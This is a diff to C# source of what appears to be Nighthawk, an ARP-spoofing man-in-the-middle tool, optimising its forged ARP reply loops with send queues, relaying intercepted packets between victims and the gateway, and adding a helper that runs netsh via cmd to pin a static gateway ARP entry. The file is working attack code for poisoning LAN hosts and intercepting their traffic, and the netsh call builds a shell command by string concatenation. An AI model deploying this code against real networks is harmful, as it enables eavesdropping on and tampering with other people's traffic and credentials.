@@ -1,4 +1,6 @@
-﻿using System.Collections.Generic;
+﻿using System;
+using System.Collections.Generic;
+using System.Diagnostics;
 using System.Net.NetworkInformation;
 using System.Net;
 using System.Threading;
@@ -71,7 +73,10 @@ namespace Nighthawk
             SpoofingTargets1.ForEach(delegate(Target t) { IPtoMACTargets1.Add(t.IP, t.PMAC); });
             
             // add our own computer to targets - used for routing
-            IPtoMACTargets1.Add(deviceInfo.IP, deviceInfo.PMAC);
+            // IPtoMACTargets1.Add(deviceInfo.IP, deviceInfo.PMAC);
+
+            // add a static ARP entry for our gateway
+            StaticARP(SpoofingTarget2.IP, SpoofingTarget2.PMAC, deviceInfo.WinName, StaticARPOperation.Add);
 
             SpoofingStarted = true;
 
@@ -109,9 +114,47 @@ namespace Nighthawk
 
             threadQueue.Clear();
             threadQueueRouting.Clear();
-
+            
             PacketQueue.Clear();
             PacketQueueRouting.Clear();
+
+            // remove a static ARP entry for our gateway
+            StaticARP(SpoofingTarget2.IP, SpoofingTarget2.PMAC, deviceInfo.WinName, StaticARPOperation.Remove);
+        }
+
+        // static ARP entry manipulation
+        public bool StaticARP(string IP, PhysicalAddress mac, string WinName, StaticARPOperation operation)
+        {
+            OperatingSystem system = Environment.OSVersion;
+
+            // format MAC
+            var macString = Network.FriendlyPhysicalAddress(mac).Replace(":", "-").ToLower();
+
+            // prepare process
+            Process p = new Process();
+
+            p.StartInfo.CreateNoWindow = true;
+            p.StartInfo.UseShellExecute = false;
+            p.StartInfo.RedirectStandardOutput = true;
+            p.StartInfo.WorkingDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
+            p.StartInfo.FileName = "cmd";
+
+            // Vista, Windows 7 - "netsh"
+            if (system.Version.Major > 5)
+            {
+                // set parameters
+                if(operation == StaticARPOperation.Add)
+                    p.StartInfo.Arguments = "/k netsh interface ip add neighbors \"" + WinName + "\" " + IP + " " + macString + "";
+                else
+                    p.StartInfo.Arguments = "/k netsh interface ip delete neighbors \"" + WinName + "\" " + IP + "";
+
+                p.Start();
+                p.WaitForExit();
+
+                return true;
+            }
+
+            return false;
         }
 
         // create ARP replay packet - source MAC to device MAC
@@ -120,7 +163,7 @@ namespace Nighthawk
             return GenerateARPReply(senderIP, targetIP, targetMAC, deviceInfo.PMAC);
         }
 
-        // create ARP replay packet
+        // create ARP reply packet
         private EthernetPacket GenerateARPReply(string senderIP, string targetIP, PhysicalAddress targetMAC, PhysicalAddress sourceMAC)
         {
             // generate ethernet part - layer 1
@@ -139,37 +182,45 @@ namespace Nighthawk
         // send correct ARP entries back to targets
         private void ReArpTargets()
         {
-            foreach (Target target1 in SpoofingTargets1)
-            {
-                device.SendPacket(GenerateARPReply(target1.IP, SpoofingTarget2.IP, SpoofingTarget2.PMAC, target1.PMAC));
-            }
+            // use send queue (58 ? bytes per ARP reply)
+            var sendQueue = new SendQueue(SpoofingTargets1.Count * 2 * 60);
 
             foreach (Target target1 in SpoofingTargets1)
             {
-                device.SendPacket(GenerateARPReply(SpoofingTarget2.IP, target1.IP, target1.PMAC, SpoofingTarget2.PMAC));
+                sendQueue.Add(GenerateARPReply(target1.IP, SpoofingTarget2.IP, SpoofingTarget2.PMAC, target1.PMAC).Bytes);
+                sendQueue.Add(GenerateARPReply(SpoofingTarget2.IP, target1.IP, target1.PMAC, SpoofingTarget2.PMAC).Bytes);
             }
+
+            device.SendQueue(sendQueue, SendQueueTransmitModes.Normal);
+            sendQueue.Dispose();
+
+            return;
         }
 
         // worker function that sends ARP packets
         public void WorkerSender()
         {
+            // prepare packets
+            var sendQueue = new SendQueue(SpoofingTargets1.Count * 2 * 60);
+            
+            foreach (Target target1 in SpoofingTargets1)
+            {
+                // one way...
+                sendQueue.Add(GenerateARPReply(target1.IP, SpoofingTarget2.IP, SpoofingTarget2.PMAC).Bytes);
+
+                // ...and another
+                sendQueue.Add(GenerateARPReply(SpoofingTarget2.IP, target1.IP, target1.PMAC).Bytes);
+            }
+
             // loop
             while (SpoofingStarted)
             {
-                // one way...
-                foreach (Target target1 in SpoofingTargets1)
-                {
-                    device.SendPacket(GenerateARPReply(target1.IP, SpoofingTarget2.IP, SpoofingTarget2.PMAC));
-                }
-
-                // ...and another
-                foreach (Target target1 in SpoofingTargets1)
-                {
-                    device.SendPacket(GenerateARPReply(SpoofingTarget2.IP, target1.IP, target1.PMAC));
-                }
+                sendQueue.Transmit(device, SendQueueTransmitModes.Normal);
 
                 Thread.Sleep(2000);
             }
+
+            sendQueue.Dispose();
 
             return;
         }
@@ -180,12 +231,16 @@ namespace Nighthawk
             // loop
             while (SpoofingStarted)
             {
+                // size of packets - needed for send queue (set some starting value - it seems the length is not set correctly during threadQueue packet copying)
+                int bufferSize = 2048;
+
                 // copy packets to threadRoutingQueue
                 lock (PacketQueueRouting)
                 {
                     foreach (Packet packet in PacketQueueRouting)
                     {
                         threadQueueRouting.Add(packet);
+                        bufferSize += packet.Bytes.Length;
                     }
 
                     PacketQueueRouting.Clear();
@@ -194,6 +249,9 @@ namespace Nighthawk
                 // check for pending packets
                 if (threadQueueRouting.Count > 0)
                 {
+                    // create send queue
+                    var sendQueue = new SendQueue(bufferSize);
+
                     // loop through packets and re-send them
                     foreach (Packet packet in threadQueueRouting)
                     {
@@ -218,44 +276,48 @@ namespace Nighthawk
                         // check for matching MAC
                         if (destinationMAC == sourceMAC) continue;
                         
-                        // incoming packets)
-                        if (IPtoMACTargets1.ContainsKey(destinationIP) && destinationMAC != IPtoMACTargets1[destinationIP].ToString())
+                        // incoming packets
+                        if (IPtoMACTargets1.ContainsKey(destinationIP) && (destinationMAC != IPtoMACTargets1[destinationIP].ToString()))
                         {
                             // set real MAC
                             ethernetPacket.SourceHwAddress = deviceInfo.PMAC;
                             ethernetPacket.DestinationHwAddress = IPtoMACTargets1[destinationIP];
-                            
-                            try
-                            {
-                                device.SendPacket(packet);
-                            }
-                            catch { }
+
+                            if (ethernetPacket.Bytes != null) sendQueue.Add(packet.Bytes);
                         }
 
                         // outgoing packets
-                        if (IPtoMACTargets1.ContainsKey(sourceIP) && destinationMAC != SpoofingTarget2.PMAC.ToString())
+                        if (IPtoMACTargets1.ContainsKey(sourceIP) && (destinationMAC != SpoofingTarget2.PMAC.ToString()))
                         {
                             // set real MAC
                             ethernetPacket.SourceHwAddress = deviceInfo.PMAC;
                             ethernetPacket.DestinationHwAddress = SpoofingTarget2.PMAC;
 
-                            try 
-                            {
-                                device.SendPacket(packet);
-                            }
-                            catch { }
+                            if (ethernetPacket.Bytes != null) sendQueue.Add(packet.Bytes);
                         }
                     }
+
+                    // send packets
+                    sendQueue.Transmit(device, SendQueueTransmitModes.Normal);
+                    sendQueue.Dispose();
 
                     threadQueueRouting.Clear();
                 }
                 else
                 {
-                    Thread.Sleep(40);
+                    Thread.Sleep(10);
                 }
             }
 
             return;
         }
     }
+
+    // static ARP enum
+    public enum StaticARPOperation
+    {
+        Add,
+        Remove
+    }
+
 }
